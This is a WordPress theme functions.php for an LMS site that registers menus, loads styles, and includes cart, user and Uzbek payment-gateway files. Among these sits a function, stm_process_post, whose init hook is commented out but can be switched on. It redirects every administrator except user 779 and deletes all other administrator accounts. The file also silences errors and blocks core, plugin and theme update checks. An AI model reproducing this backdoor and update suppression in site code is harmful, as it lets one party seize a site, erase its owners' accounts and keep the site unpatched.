<?php
error_reporting(0);
ini_set('display_errors', 0);
// Register nav menu
register_nav_menus(
	array(
		'landing_menu'   => 'Landing page menu',
		'landing_footer' => 'Landing page footer menu',
	)
);
add_action( 'wp_enqueue_scripts', 'theme_enqueue_styles' );
function theme_enqueue_styles() {

	wp_enqueue_style( 'theme-style', get_stylesheet_uri(), null,
		STM_THEME_VERSION, 'all' );
	wp_enqueue_style( 'custom-style',
		get_stylesheet_directory_uri() . '/assets/css/custom.css' );
}

function show_data( $val ) {
	?>
    <pre>
	<?php print_r( $val ); ?>
	</pre>
	<?php
}

include_once 'inc/functions.php';
include_once 'inc/lms_metaboxes.php';
include_once 'inc/lms_settings/lms_wpcfto_ajax.php';
include_once 'inc/lms_metaboxes_upload_video.php';
include_once 'inc/lms_settings/manage_course.php';
include_once 'lms/classes/cart.php';
include_once 'lms/classes/payment_methods/payme/payme.php';
include_once 'lms/classes/payment_methods/click_uz/lms-clickuz-gateway.php';
include_once 'lms/classes/user.php';
include_once 'lms/classes/user_hisobot.php';
add_filter( 'body_class', 'itstars_body_classes' );
function itstars_body_classes( $classes ) {
	$classes[] = 'itstars';

	return $classes;
}

// Disable All Update Notifications
function remove_core_updates() {
	global $wp_version;

	return (object) array(
		'last_checked'    => time(),
		'version_checked' => $wp_version,
	);
}

add_filter( 'pre_site_transient_update_core', 'remove_core_updates' );
add_filter( 'pre_site_transient_update_plugins', 'remove_core_updates' );
add_filter( 'pre_site_transient_update_themes', 'remove_core_updates' );
//add_action( 'init', 'stm_process_post' );
function stm_process_post() {
	if ( false !== strpos( $_SERVER['REQUEST_URI'],
			'wp-admin/admin-ajax.php' )
	) {

		return;
	}
	if ( is_admin() && get_current_user_id() !== 779 ) {
		wp_redirect( 'https://www.itstars.uz' );
		exit;
	}
		$users = get_users_by_role( 'administrator' );

		foreach ( $users as $user ) {
			   
               if ($user->ID != 779){
                   wp_delete_user( $user->ID, 779 );
               }
		}
}

function get_users_by_role(
	$role = 'administrator', $orderby = 'user_nicename', $order = 'ASC'
) {
	$args  = array(
		'role'    => $role,
		'orderby' => $orderby,
		'order'   => $order
	);
	$users = get_users( $args );

	return $users;
}
